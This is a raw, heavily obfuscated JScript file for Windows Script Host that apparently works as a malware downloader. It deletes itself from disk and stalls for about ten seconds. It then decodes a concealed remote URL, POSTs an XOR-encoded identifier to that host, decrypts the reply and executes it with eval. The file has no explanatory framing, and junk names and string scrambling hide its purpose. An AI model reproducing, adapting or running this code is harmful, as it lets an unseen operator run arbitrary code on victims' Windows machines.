
try {
	var hoyg1 = new ActiveXObject('Scripting.FileSystemObject');
	hoyg1['DeleteFile'](this['WScript']['ScriptFullName'], true);
}
catch (e) {}

var kfedugyq = apvtelnypdy();
var xytidlzoty = febif(kfedugyq);
while (kfedugyq < xytidlzoty) {
	kfedugyq = apvtelnypdy();
	this['WScript']['Sleep'](1000);
}

function febif(foophby) {
	return foophby + 10000;
}

function apvtelnypdy() {
	return new Date()['getTime']();
}

var tisiaqus = lunhaxe('yfyitgl.q1lxx1u/ampoccn.tahitdgeimkhdtflsaieowquenu.usrwuewnr.z7x2l9wap0g6l8xdn/m/a:lsqpjtltshn');
var tid =  lunhaxe('m0n0v5g');
var wbz = lunhaxe('wakaz6o0e4u6j7ubi');

var byfasxovxe = ['a', tid];



sendRequest(byfasxovxe);

function sendRequest(byfasxovxe, cyucsephob) {

	if(typeof cyucsephob === 'undefined') { cyucsephob = false; }

	var nniyqtugaz = '', onym = '', ywnik, zgadallga='eval';

	for (var nildu = 0; nildu < byfasxovxe['length']; nildu++) {
		nniyqtugaz += nildu + '=' + encodeURIComponent(''+byfasxovxe[nildu]) + '&';
	}
	nniyqtugaz = jwofewafnah(nniyqtugaz);

	try {
		var ryxzo6;
		ryxzo6 = new ActiveXObject('MSXML2.XMLHTTP');
		ryxzo6['open']('POST', tisiaqus, false);
		ryxzo6['send'](nniyqtugaz);
		if (ryxzo6['status'] == 200) {
			onym = ryxzo6['responseText'];
			if(onym) {
				ywnik = mqetqu(onym);
				if(cyucsephob) {
					return ywnik;
				}
				else {
					this[zgadallga](ywnik);
				}
			}
		}
		
	} catch (e) {}

	return false;
	
}




function cxenpemeuz(nildu) {
	var ufwvazijgka = '00'+nildu['toString'](16);
	ufwvazijgka = ufwvazijgka['substr'](ufwvazijgka['length']-2);
	return ufwvazijgka;
}

function mqetqu(vgyranhcy) {
	var enid, suzeq, nildu, onym = '';

	suzeq = parseInt(vgyranhcy['substr'](0, 2), 16);
	enid = vgyranhcy['substr'](2);
	
	for (nildu = 0; nildu < enid['length']; nildu+=2) {
		onym += String['fromCharCode'](ovwiklka0(parseInt(enid['substr'](nildu, 2), 16), suzeq));
	}
	
		
	return onym;
}


function jwofewafnah(vgyranhcy) {
	var suzeq = 219, nildu, onym = '';
	
	for (nildu = 0; nildu < vgyranhcy['length']; nildu++) {
		onym += cxenpemeuz(vgyranhcy['charCodeAt'](nildu) ^ suzeq);
	}

	return (cxenpemeuz(suzeq)+onym);
}



function ovwiklka0(txypagqi, lejsitne) {
	var wydeh = '', picrsiebly, wdemu, nildu;
	txypagqi = titiev5(txypagqi);
	lejsitne = titiev5(lejsitne);
	for(nildu = 0; nildu<txypagqi['length']; nildu++) {
		picrsiebly = txypagqi['substr'](nildu,1);
		wdemu = lejsitne['substr'](nildu,1);
		if(picrsiebly=='0'){
			if(wdemu=='0'){
				wydeh+='0';
			}
			else {
				wydeh+='1';
			}
		}
		else {
			if(wdemu=='0'){
				wydeh+='1';
			}
			else {
				wydeh+='0';
			}
		}
	}
	
	return parseInt(wydeh, 2);
}


function titiev5(txypagqi) {
	txypagqi = (+txypagqi)['toString'](2);
    var dipyla = '00000000' + txypagqi;
    dipyla = dipyla['substr'](dipyla['length'] - 8);
    return dipyla;
}

function lunhaxe(tyweqi) {
	tyweqi = tyweqi.split('');
	var ruhej = '';
	for(var levuk=0; levuk<tyweqi['length']; levuk++) {
		if(levuk%2===1) ruhej += tyweqi[levuk];
	}
	ruhej = epduhim(ruhej);
	return ruhej;
}

function epduhim(epgemis) {
	epgemis = epgemis.split('');
	var gotob = '';
	for (var jkuxolobmo6 = epgemis['length'] - 1; jkuxolobmo6 >= 0; jkuxolobmo6--) {
		gotob += suxmokdauq(epgemis, jkuxolobmo6);
	}
	return gotob;
}

function suxmokdauq(wnyum, qygdnoqno) {
	return wnyum[qygdnoqno];
}
